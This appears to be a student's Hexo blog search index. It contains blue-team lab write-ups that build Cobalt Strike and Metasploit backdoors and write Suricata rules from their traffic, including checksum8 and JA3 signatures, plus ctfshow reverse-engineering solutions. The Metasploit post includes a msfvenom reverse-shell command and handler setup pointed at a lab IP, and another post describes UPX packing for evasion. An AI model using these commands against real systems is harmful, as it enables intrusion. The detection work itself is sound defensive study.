<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>欢迎来到我的博客</title>
    <url>/hello%20world/</url>
    <content><![CDATA[<p>这是一个计算机菜鸟的博客，我将在这里分享逆向工程，数据结构的学习笔记，在之后也会分享</p>
<p>c++,web安全，python的一些学习笔记（画个饼先）。欢迎各位一起交流学习</p>
<h2 id="自我介绍"><a href="#自我介绍" class="headerlink" title="自我介绍"></a>自我介绍</h2><h3 id="我的专业？"><a href="#我的专业？" class="headerlink" title="我的专业？"></a>我的专业？</h3><p>现在是一名大二的机械狗，至于会不会转去计科？我也不知道(ok也是成功转入计科了)</p>
<h3 id="为啥要建博客？"><a href="#为啥要建博客？" class="headerlink" title="为啥要建博客？"></a>为啥要建博客？</h3><p>闲着没事干（bushi）想在这里存放我脑子里微不足道的知识以方便未来的你我，如果没有帮助到你，我只能说sorry了</p>
<h3 id="欧克，我要说的话就这些，希望你能在我的博客有所收获"><a href="#欧克，我要说的话就这些，希望你能在我的博客有所收获" class="headerlink" title="欧克，我要说的话就这些，希望你能在我的博客有所收获"></a>欧克，我要说的话就这些，希望你能在我的博客有所收获</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;hello world&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/images/liuhua.gif" alt="liuhua"></p>
]]></content>
  </entry>
  <entry>
    <title>CS后门源码特征分析</title>
    <url>/CS%E5%90%8E%E9%97%A8%E6%BA%90%E7%A0%81%E7%89%B9%E5%BE%81%E5%88%86%E6%9E%90%E4%B8%8EIDS%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/</url>
    <content><![CDATA[<h2 id="CS后门源码特征分析"><a href="#CS后门源码特征分析" class="headerlink" title="CS后门源码特征分析"></a><strong>CS后门源码特征分析</strong></h2><p>cs?cs go！来看看经典后门的流量分析吧</p>
<span id="more"></span>

<p>首先准备好cs在kali中解压后进入cs的文件目录中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod 777 *  #然后使用chmod命令给所有的文件可读可写可执行权限</span><br></pre></td></tr></table></figure>

<p>然后设置并启动cs</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./teamserver lhost 密码 </span><br></pre></td></tr></table></figure>

<p><img src="/../images/hw3/1.png"></p>
<p>之后在物理机上运行cs</p>
<p><img src="/../images/hw3/2.png"></p>
<p>登陆账号密码后进入后台</p>
<p><img src="/../images/hw3/3.png"></p>
<p>新建一个监听器</p>
<p><img src="/../images/hw3/4.png"></p>
<p> 生成一个木马文件并选择监听器生成并保存在文件夹中</p>
<p><img src="/../images/hw3/5.png"></p>
<p>在物理机中双击运行文件发现物理机成功在后台上线</p>
<p><img src="/../images/hw3/6.png"></p>
<p>然后抓取流量包，使用筛选指令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ip.addr==192.168.1.225</span><br></pre></td></tr></table></figure>

<p><img src="/../images/hw3/7.png"></p>
<p><img src="/../images/hw3/8.png"></p>
<p>在流量包中找到特征码&#x3D;&#x3D;KZlL&#x3D;&#x3D;</p>
<p><img src="/../images/hw3/9.png"></p>
<p>使用java的&#x3D;&#x3D;checksum8&#x3D;&#x3D;算法来计算</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EchoTest</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">long</span> <span class="title function_">checksum8</span><span class="params">(String text)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (text.length() &lt; <span class="number">4</span>) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> <span class="number">0L</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    text = text.replace(<span class="string">&quot;/&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">long</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> <span class="number">0</span>; x &lt; text.length(); x++) &#123;</span><br><span class="line"></span><br><span class="line">      sum += text.charAt(x);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> sum % <span class="number">256L</span>;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">    System.out.println(checksum8(<span class="string">&quot;KZlL&quot;</span>));</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>结果输出为93，说明了这是一个64位的木马</p>
<p><img src="/../images/hw3/10.png"></p>
<p>这里再生成一个32位的后门木马</p>
<p>在win7虚拟机中运行木马文件可以看到win7在监听器中上线</p>
<p><img src="/../images/hw3/12.png"></p>
<p>在wireshark打开流量检测找到第一个请求头</p>
<p><img src="/../images/hw3/11.png"></p>
<p>使用java的&#x3D;&#x3D;checksum8&#x3D;&#x3D;算法来计算特征码&#x3D;&#x3D;Y2Wz&#x3D;&#x3D;</p>
<p><img src="/../images/hw3/13.png"></p>
<p>可以得到结果92而92也正好表示为32位木马文件</p>
<p>创建一个http的规则文件，命名位&#x3D;&#x3D;cshttp&#x3D;&#x3D;将规则写入</p>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line"><span class="comment"># suricata规则</span></span><br><span class="line"><span class="comment"># http-beacon-staging，向c2服务器发起get请求，下载大小约210kb的stager，请求地址符合checksum8规则</span></span><br><span class="line"><span class="comment"># 调用lua检查uri是否符合checksum8规则：计算uri的ascii之和并与256做取余计算，余数为92则符合规则</span></span><br><span class="line">alert http <span class="built_in">any</span> <span class="built_in">any</span> <span class="operator">-&gt;</span> <span class="built_in">any</span> <span class="built_in">any</span> <span class="punctuation">(</span>gid<span class="operator">:</span><span class="number">3333</span>; sid<span class="operator">:</span><span class="number">30001</span>; rev<span class="operator">:</span><span class="number">1</span>; <span class="punctuation">\</span></span><br><span class="line">    msg<span class="operator">:</span><span class="string">&quot;http-beacon-checksum8-path-parse&quot;</span>; <span class="punctuation">\</span></span><br><span class="line">    classtype<span class="operator">:</span> http<span class="operator">-</span>beacon; <span class="punctuation">\</span></span><br><span class="line">    flow<span class="operator">:</span> established<span class="punctuation">,</span> to_server; <span class="punctuation">\</span></span><br><span class="line">    urilen<span class="operator">:</span><span class="number">4</span><span class="operator">&lt;</span><span class="operator">&gt;</span><span class="number">6</span>; <span class="punctuation">\</span></span><br><span class="line">    luajit<span class="operator">:</span>checksum8_check.lua; <span class="punctuation">\</span></span><br><span class="line"><span class="punctuation">)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># checksum8_check.lua</span></span><br><span class="line"><span class="keyword">function</span> init <span class="punctuation">(</span>args<span class="punctuation">)</span></span><br><span class="line">    local needs <span class="operator">=</span> <span class="punctuation">&#123;</span><span class="punctuation">&#125;</span></span><br><span class="line">    needs<span class="punctuation">[</span><span class="string">&quot;http.uri&quot;</span><span class="punctuation">]</span> <span class="operator">=</span> tostring<span class="punctuation">(</span>true<span class="punctuation">)</span></span><br><span class="line">    <span class="built_in">return</span> needs</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> match<span class="punctuation">(</span>args<span class="punctuation">)</span></span><br><span class="line">    local uri_raw <span class="operator">=</span> tostring<span class="punctuation">(</span>args<span class="punctuation">[</span><span class="string">&quot;http.uri&quot;</span><span class="punctuation">]</span><span class="punctuation">)</span></span><br><span class="line">    local uri <span class="operator">=</span> string.sub<span class="punctuation">(</span>uri_raw<span class="punctuation">,</span> <span class="number">2</span><span class="punctuation">,</span> <span class="operator">-</span><span class="number">1</span><span class="punctuation">)</span> <span class="operator">-</span><span class="operator">-</span> 去除uri中的<span class="string">&quot;/&quot;</span></span><br><span class="line">    local <span class="built_in">sum</span> <span class="operator">=</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i<span class="operator">=</span><span class="number">1</span><span class="punctuation">,</span><span class="comment">#uri do</span></span><br><span class="line">        local x <span class="operator">=</span> string.sub<span class="punctuation">(</span>uri<span class="punctuation">,</span>i<span class="punctuation">,</span>i<span class="punctuation">)</span></span><br><span class="line">        <span class="built_in">sum</span> <span class="operator">=</span> <span class="built_in">sum</span> <span class="operator">+</span> string.byte<span class="punctuation">(</span>x<span class="punctuation">)</span></span><br><span class="line">    end</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="punctuation">(</span><span class="built_in">sum</span> % <span class="number">256</span><span class="punctuation">)</span> <span class="operator">==</span> <span class="number">92</span> then</span><br><span class="line">        <span class="built_in">return</span> <span class="number">1</span> <span class="operator">-</span><span class="operator">-</span> 符合checksum8规则，匹配成功</span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">        <span class="built_in">return</span> <span class="number">0</span> <span class="operator">-</span><span class="operator">-</span> 不符合checksum8规则，匹配失败</span><br><span class="line">    end</span><br><span class="line">end</span><br></pre></td></tr></table></figure>

<p>然后放入suricata的规则文件夹之中运行之后再查看日志</p>
<p><img src="/../images/hw3/14.png"></p>
<p>之后再生成一个https型的后门，先创建一个新的监听器</p>
<p><img src="/../images/hw3/15.png"></p>
<p>再生成一个可执行的恶意文件</p>
<p><img src="/../images/hw3/16.png"></p>
<p>之后在物理机中运行用wirehshark进行流量监测可以发现JA3码具有明显的特征</p>
<p><img src="/../images/hw3/17.png"></p>
<p>编写规则文件</p>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line"><span class="comment"># https-beacon-ja3指纹，client-hello</span></span><br><span class="line">alert tls <span class="built_in">any</span> <span class="built_in">any</span> <span class="operator">-&gt;</span> <span class="built_in">any</span> <span class="built_in">any</span> <span class="punctuation">(</span>gid<span class="operator">:</span><span class="number">6666</span>; sid<span class="operator">:</span><span class="number">30005</span>; rev<span class="operator">:</span><span class="number">1</span>; <span class="punctuation">\</span></span><br><span class="line">    msg<span class="operator">:</span><span class="string">&quot;https-beacon-ja3-hash&quot;</span>; <span class="punctuation">\</span></span><br><span class="line">    classtype<span class="operator">:</span> https<span class="operator">-</span>beacon; <span class="punctuation">\</span></span><br><span class="line">    ja3.hash; pcre<span class="operator">:</span><span class="string">&quot;/652358a663590cfc624787f06b82d9ae|4d93395b1c1b9ad28122fb4d09f28c5e|72a589da586844d7f0818ce684948eea|a0e9f5d64349fb13191bc781f81f42e1/&quot;</span>; <span class="punctuation">\</span></span><br><span class="line"><span class="punctuation">)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># https-beacon-ja3s指纹，server-hello</span></span><br><span class="line">alert tls <span class="built_in">any</span> <span class="built_in">any</span> <span class="operator">-&gt;</span> <span class="built_in">any</span> <span class="built_in">any</span> <span class="punctuation">(</span>gid<span class="operator">:</span><span class="number">6666</span>; sid<span class="operator">:</span><span class="number">30006</span>; rev<span class="operator">:</span><span class="number">1</span>; <span class="punctuation">\</span></span><br><span class="line">    msg<span class="operator">:</span><span class="string">&quot;https-beacon-ja3s-hash&quot;</span>; <span class="punctuation">\</span></span><br><span class="line">    classtype<span class="operator">:</span> https<span class="operator">-</span>beacon; <span class="punctuation">\</span></span><br><span class="line">    ja3s.hash; pcre<span class="operator">:</span><span class="string">&quot;/fd4bc6cea4877646ccd62f0792ec0b62|15af977ce25de452b96affa2addb1036|b742b407517bac9536a77a7b0fee28e9/&quot;</span>; <span class="punctuation">\</span></span><br><span class="line"><span class="punctuation">)</span></span><br></pre></td></tr></table></figure>

<p>查看日志</p>
<p><img src="/../images/hw3/18.png"></p>
<h2 id="加壳免杀处理流量分析"><a href="#加壳免杀处理流量分析" class="headerlink" title="加壳免杀处理流量分析"></a>加壳免杀处理流量分析</h2><p>因为是在无安全软件的干扰下进行的我们直接用一个最简单的upx壳来当作免杀处理</p>
<p><img src="/../images/hw3/19.png"></p>
<p><img src="/../images/hw3/20.png"></p>
<p>加壳之后先运行64位的后门软件,然后运行抓包，再将心跳包后缀改为vir文件解密</p>
<p><img src="/../images/hw3/21.png"></p>
<p>看上去upx壳并不能对最后解析的结果产生作用</p>
<p>再运行32位的http后门，将生成的心跳包用工具解密</p>
<p><img src="/../images/hw3/22.png"></p>
<p>可以看到同样也将心跳包的内容解密出来了</p>
<p>由此可见一些简单的加壳对心跳包的解读是没有影响的</p>
]]></content>
      <categories>
        <category>护网蓝队</category>
      </categories>
      <tags>
        <tag>蓝队</tag>
      </tags>
  </entry>
  <entry>
    <title>流量分析-MSF-模式模块（shell/meterpreter）-源码特征</title>
    <url>/msf%E5%90%8E%E9%97%A8%E7%89%B9%E5%BE%81%E6%A3%80%E6%B5%8B/</url>
    <content><![CDATA[<h2 id="流量分析-MSF-模式模块（shell-meterpreter）-源码特征"><a href="#流量分析-MSF-模式模块（shell-meterpreter）-源码特征" class="headerlink" title="流量分析-MSF-模式模块（shell&#x2F;meterpreter）-源码特征"></a>流量分析-MSF-模式模块（shell&#x2F;meterpreter）-源码特征</h2><h3 id="生成shell模式后门"><a href="#生成shell模式后门" class="headerlink" title="生成shell模式后门"></a>生成shell模式后门</h3><p><img src="/../images/hw2/1.png"></p>
<p>将生成的可执行文件6666.exe放入目标物理机中（目标物理机需要关闭杀毒文件）</p>
<span id="more"></span>

<h3 id="打开msf监听器"><a href="#打开msf监听器" class="headerlink" title="打开msf监听器"></a>打开msf监听器</h3><p>输入命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfconsole    #进入msf命令行</span><br><span class="line">use exploit/multi/handler 	#使用武器库</span><br><span class="line">set payload windows/x64/shell/reverse_tcp   #设置payload</span><br><span class="line">set lhost 192.168.1.47   #设置监听器本地地址</span><br><span class="line">set lport 6666	#设置端口号</span><br><span class="line">run	#启动监听器</span><br></pre></td></tr></table></figure>

<p><img src="/../images/hw2/4.png"></p>
<p>在物理机上运行6666.exe,上线后台</p>
<p><img src="/../images/hw2/5.png"></p>
<h3 id="打开wireshark分析捕获流量"><a href="#打开wireshark分析捕获流量" class="headerlink" title="打开wireshark分析捕获流量"></a>打开wireshark分析捕获流量</h3><p>打开wireshark后选择&#x3D;&#x3D;eth0&#x3D;&#x3D;</p>
<p>在监听器输入&#x3D;&#x3D;ipconfig&#x3D;&#x3D;，&#x3D;&#x3D;whoami&#x3D;&#x3D;,wireshark过滤指令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tcp.port==6666</span><br></pre></td></tr></table></figure>

<p>查看流量追踪流</p>
<p><img src="/../images/hw2/6.png"></p>
<p>可以看见是很明显的明文</p>
<h3 id="生成-meterpreter-模式的后门"><a href="#生成-meterpreter-模式的后门" class="headerlink" title="生成 meterpreter 模式的后门"></a>生成 meterpreter 模式的后门</h3><p><img src="/../images/hw2/7.png"></p>
<p>将生成的6667.exe放入物理机中，然后打开msf监听器</p>
<p><img src="/../images/hw2/8.png"></p>
<p>在物理机中运行6667.exe，上线后台</p>
<p><img src="/../images/hw2/9.png"></p>
<h3 id="wireshark分析捕获流量"><a href="#wireshark分析捕获流量" class="headerlink" title="wireshark分析捕获流量"></a>wireshark分析捕获流量</h3><p>在wireshark输入命令过滤流量</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tcp.port==6667</span><br></pre></td></tr></table></figure>

<p>在监听端输入&#x3D;&#x3D;ls&#x3D;&#x3D;发现不是明文与shell模式不一样</p>
<p><img src="/../images/hw2/10.png"></p>
<p>保存然后再生成一个同样的后门&#x3D;&#x3D;6677.exe&#x3D;&#x3D;</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.47 lport=6677 -f exe -o 6677.exe</span><br></pre></td></tr></table></figure>

<p>在监听器处输入exit重新配置payload，lhost，lport</p>
<p><img src="/../images/hw2/11.png"></p>
<p>物理机在后台上线后输入指令ls,并分析流量</p>
<p><img src="/../images/hw2/12.png"></p>
<h2 id="流量分析-MSF-HTTP-S-基础特征"><a href="#流量分析-MSF-HTTP-S-基础特征" class="headerlink" title="流量分析-MSF-HTTP&#x2F;S-基础特征"></a>流量分析-MSF-HTTP&#x2F;S-基础特征</h2><h3 id="生成http型"><a href="#生成http型" class="headerlink" title="生成http型"></a>生成http型</h3><p><img src="/../images/hw2/2.png"></p>
<p>设置监测后台配置</p>
<p><img src="/../images/hw2/13.png"></p>
<p>在物理机中运行6668.exe打开wireshark分析流量</p>
<p><img src="/../images/hw2/14.png"></p>
<p>可以发现有http协议的数据内容</p>
<h3 id="生成https型"><a href="#生成https型" class="headerlink" title="生成https型"></a>生成https型</h3><p><img src="/../images/hw2/3.png"></p>
<p>上线木马后开启抓包</p>
<p><img src="/../images/hw2/15.png"></p>
<p>运行7777.exe上次后抓取流量包，执行getuid命令</p>
<p><img src="/../images/hw2/16.png"></p>
<p><img src="/../images/hw2/17.png"></p>
<h2 id="反制规则-MSF-Suricata-编写-检测"><a href="#反制规则-MSF-Suricata-编写-检测" class="headerlink" title="反制规则-MSF-Suricata-编写&amp;检测"></a>反制规则-MSF-Suricata-编写&amp;检测</h2><p> 之前在做 https 类型的后门时分析过数据包的特征发现，Client Hello 和 Server Hello 的数 据包中的 JA3 值只会出现 42个值分别为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">4d93395b1c1b9ad28122fb4d09f28c5e</span><br><span class="line">652358a663590cfc624787f06b82d9ae</span><br><span class="line">15af977ce25de452b96affa2addb1036</span><br><span class="line">2253c82f03b621c5144709b393fde2c9</span><br></pre></td></tr></table></figure>

<p>写一个rules文件</p>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line"><span class="comment"># https-beacon-ja3指纹，client-hello</span></span><br><span class="line">alert tls <span class="built_in">any</span> <span class="built_in">any</span> <span class="operator">-&gt;</span> <span class="built_in">any</span> <span class="built_in">any</span> <span class="punctuation">(</span>gid<span class="operator">:</span><span class="number">6666</span>; sid<span class="operator">:</span><span class="number">30005</span>; rev<span class="operator">:</span><span class="number">1</span>; <span class="punctuation">\</span></span><br><span class="line">    msg<span class="operator">:</span><span class="string">&quot;https-beacon-ja3-hash&quot;</span>; <span class="punctuation">\</span></span><br><span class="line">    classtype<span class="operator">:</span> https<span class="operator">-</span>beacon; <span class="punctuation">\</span></span><br><span class="line">    ja3.hash; pcre<span class="operator">:</span><span class="string">&quot;/652358a663590cfc624787f06b82d9ae|4d93395b1c1b9ad28122fb4d09f28c5e/&quot;</span>; <span class="punctuation">\</span></span><br><span class="line"><span class="punctuation">)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># https-beacon-ja3s指纹，server-hello</span></span><br><span class="line">alert tls <span class="built_in">any</span> <span class="built_in">any</span> <span class="operator">-&gt;</span> <span class="built_in">any</span> <span class="built_in">any</span> <span class="punctuation">(</span>gid<span class="operator">:</span><span class="number">6666</span>; sid<span class="operator">:</span><span class="number">30006</span>; rev<span class="operator">:</span><span class="number">1</span>; <span class="punctuation">\</span></span><br><span class="line">    msg<span class="operator">:</span><span class="string">&quot;https-beacon-ja3s-hash&quot;</span>; <span class="punctuation">\</span></span><br><span class="line">    classtype<span class="operator">:</span> https<span class="operator">-</span>beacon; <span class="punctuation">\</span></span><br><span class="line">    ja3s.hash; pcre<span class="operator">:</span><span class="string">&quot;/15af977ce25de452b96affa2addb1036|2253c82f03b621c5144709b393fde2c9/&quot;</span>; <span class="punctuation">\</span></span><br><span class="line"><span class="punctuation">)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>将命令写入msf.rules文件中在放入&#x2F;etc&#x2F;suricata&#x2F;rules&#x2F;文件夹中</p>
<p>输入命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">suricata -c /etc/suricata/suricata.yaml -s /etc/suricata/rules/msf.rules -i eth0</span><br></pre></td></tr></table></figure>

<p><img src="/../images/hw2/20.png"></p>
<p>之后上线木马，输入getuid</p>
<p><img src="/../images/hw2/19.png"></p>
<p>之后查看日志，输入命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /var/log/suricata/fast.log</span><br></pre></td></tr></table></figure>

<img src="../images/hw2/21.png" style="zoom:150%;" />



]]></content>
      <categories>
        <category>蓝队检测</category>
      </categories>
      <tags>
        <tag>蓝队</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshow wp</title>
    <url>/ctfshow/</url>
    <content><![CDATA[<p>立志做完ctfshow上的每一道逆向题（持续更新哦）</p>
<span id="more"></span>

<h2 id="Re1"><a href="#Re1" class="headerlink" title="Re1"></a>Re1</h2><p>得到一个无格式文件用010看看是一个.elf文件</p>
<p><img src="/../images/ctfshow/re1%201.png"></p>
<p>再用ida打开看看</p>
<p><img src="/../images/ctfshow/re%202.png"></p>
<p>可以以下就看懂程序的逻辑，判断输入的是否为flag{7ujm8ikhy6}如果是则输出flag{7ujm8ikhy6}说明flag就是flag{7ujm8ikhy6}</p>
<h2 id="Re2"><a href="#Re2" class="headerlink" title="Re2"></a>Re2</h2><p>题目给到一份txt文件和一个名为勒索病毒的软件，打开一看是乱码且位ANSI格式</p>
<p><img src="/../images/ctfshow/re2%201.png"></p>
<p>拿去解码没有头绪，再看看exe可执行文件</p>
<p><img src="/../images/ctfshow/re2%202.png"></p>
<p>一个无壳的32位可执行文件，用ida打开后可以看到对flag文件进行了一个加密操作</p>
<p><img src="/../images/ctfshow/re2%203.png"></p>
<p>我们对 &#x3D;&#x3D;sub_401037&#x3D;&#x3D;进行分析，看看它的交叉引用函数</p>
<p><img src="/../images/ctfshow/re2%204.png"></p>
<p>打开 &#x3D;&#x3D;sub_401A70&#x3D;&#x3D;</p>
<p><img src="/../images/ctfshow/re2%205.png"></p>
<p>可以看到要得到str1需要&#x3D;&#x3D;”DH<del>mqqvqxB^||zll@Jq</del>jkwpmvez{“&#x3D;&#x3D;与1f进行一个异或操作，这里写一个py脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">string = <span class="string">&#x27;DH~mqqvqxB^||zll@Jq~jkwpmvez&#123;&#x27;</span></span><br><span class="line">str1=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> string:</span><br><span class="line">    str1 +=<span class="built_in">chr</span>(<span class="built_in">ord</span>(i)^<span class="number">31</span>)</span><br><span class="line">    <span class="built_in">print</span>(str1)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">##[Warnning]Access_Unauthorized</span></span><br></pre></td></tr></table></figure>

<p>继续分析下面的函数</p>
<p><img src="/../images/ctfshow/re2%206.png"></p>
<p>可以看到是一个经典的rc4解密，因此可以认为str1为密钥，而enflag中的内容为被rc4加密后的密文，只需解密即可拿到flag，这里的enflag为ANSI，将其放到010Editor中查看十六进制数</p>
<p><img src="/../images/ctfshow/re2%207.png"></p>
<p>在线rc4解密拿到flag</p>
<p><img src="/../images/ctfshow/re2%208.png"></p>
<h2 id="Re3"><a href="#Re3" class="headerlink" title="Re3"></a>Re3</h2><p>先进行查壳为一个64位的Gcc编写的程序</p>
<p><img src="/../images/ctfshow/re3.png"></p>
<p>用ida64打开反编译再看伪代码</p>
<p><img src="/../images/ctfshow/re3-1.png"></p>
<p>分析最后循环可以得到v17进行一个累加得到v16，最后v16如果与0FFF相等，则输出正确，所以要找到v16的最后一个数</p>
<p>这里直接写一个爆破脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0xffff</span>):</span><br><span class="line">    v17 = [<span class="number">80</span>,<span class="number">64227</span>,<span class="number">226312059</span>,<span class="number">0xA43499F6</span>,(<span class="number">5</span> &lt;&lt; <span class="number">12</span>) + <span class="number">16</span>,<span class="number">3833</span>, j]</span><br><span class="line">    v16 = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        v16 += v17[i]</span><br><span class="line">        <span class="keyword">while</span> v16 &gt; <span class="number">0xffff</span>:</span><br><span class="line">            </span><br><span class="line">            v15 = v16 &gt;&gt; <span class="number">16</span></span><br><span class="line">            v16 = (v15 + (v16 &amp; <span class="number">0xffff</span>)) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> v16 == <span class="number">0xffff</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">hex</span>(j))</span><br><span class="line">        </span><br></pre></td></tr></table></figure>

<p>得到最后一位0x1a9f，所以flag为flag{1a9f}</p>
<h2 id="逆向4"><a href="#逆向4" class="headerlink" title="逆向4"></a>逆向4</h2><p>首先查壳</p>
<p><img src="/../images/ctfshow/re4%201.png"></p>
<p> 一个无壳的64位可执行文件用ida打开分析再经过动调</p>
<p><img src="/../images/ctfshow/re4%202.png"></p>
<p>加密函数是&#x3D;&#x3D;sub_7FF7E7F610E0&#x3D;&#x3D;进入加密函数</p>
<p><img src="/../images/ctfshow/re4%203.png"></p>
<p>分析对我们输入的数进行了如下操作：</p>
<p>1，先将这个数字与26经过模运算后作为字符数组&#x3D;&#x3D;)(*&amp;^%489$!057@#&gt;&lt;:2163qwe&#x3D;&#x3D;的索引值</p>
<p>2，再将这串数字整除26直到整除结果为0结束循环</p>
<p>3，再将每个索引值与7进行异或操作然后进入&#x3D;&#x3D;sub_7FF7E7F61220&#x3D;&#x3D;函数</p>
<p><img src="/../images/ctfshow/re4%204.png"></p>
<p>分析可知是将异或过的值与字符数组 &#x3D;&#x3D;..v4p$$!&gt;Y59&#x3D;&#x3D;进行比较，若相等则进入&#x3D;&#x3D;sub_7FF7E7F612E0&#x3D;&#x3D;否则&#x3D;&#x3D;sub_7FF7E7F612B0&#x3D;&#x3D;查看这两个函数分别是显示成功与失败的函数</p>
<p><img src="/../images/ctfshow/re4%205.png"></p>
<p><img src="/../images/ctfshow/re4%206.png"></p>
<p>因此最后一个逻辑为验证异或过的值是否与&#x3D;&#x3D;&#x3D;&#x3D;..v4p$$!&gt;Y59&#x3D;&#x3D;&#x3D;&#x3D;相等</p>
<p>python脚本如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">check_string=<span class="string">&#x27;/..v4p$$!&gt;Y59-&#x27;</span></span><br><span class="line">table = <span class="string">&#x27;)(*&amp;^%489$!057@#&gt;&lt;:2163qwe&#x27;</span></span><br><span class="line">index =<span class="string">&#x27;&#x27;</span></span><br><span class="line">d = [<span class="built_in">chr</span>(<span class="built_in">ord</span>(char) ^ <span class="number">7</span>) <span class="keyword">for</span> char <span class="keyword">in</span> check_string]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_index</span>(<span class="params">char, char_array</span>):</span><br><span class="line">    <span class="keyword">return</span> char_array.index(char)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_index_table</span>(<span class="params">d, table</span>):</span><br><span class="line">    c = []</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> d:</span><br><span class="line">        index = find_index(char, table)</span><br><span class="line">        c.append(index)</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line">c = create_index_table(d, table)</span><br><span class="line"><span class="built_in">print</span>( c)</span><br><span class="line">flag = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)):</span><br><span class="line">    flag*=<span class="number">26</span></span><br><span class="line">    flag+=c[i]</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="逆向5"><a href="#逆向5" class="headerlink" title="逆向5"></a>逆向5</h2><p>今天来一个骚的解题方法首先得到一个无后缀的文件，首先用010editor打开发现是一个zip文件，将其后缀改为zip解压得到一个可执行文件与dll文件，随后对两个文件进行查壳，发现dll文件有一个ASPack的壳</p>
<p><img src="/../images/ctfshow/re5%201.png"></p>
<p><img src="/../images/ctfshow/re5%202.png"></p>
<p>而call_1.exe无壳，随后用ida打开进行分析</p>
<p><img src="/../images/ctfshow/re5%209.png"></p>
<p>进入主函数先分析 &#x3D;&#x3D;sub_4020B0&#x3D;&#x3D;发现这个函数没有什么作用，进而分析&#x3D;&#x3D;sub_4015BD&#x3D;&#x3D;</p>
<p><img src="/../images/ctfshow/re5%2010.png"></p>
<p>这段伪代码的逻辑为判断Str字符串的第二位是否为1否则不执行下面的步骤，查看Str发现为&#x3D;&#x3D;dba54edb0?d6&gt;7??3ef0f1caf2ad3102&#x3D;&#x3D;</p>
<p><img src="/../images/ctfshow/re5%2011.png"></p>
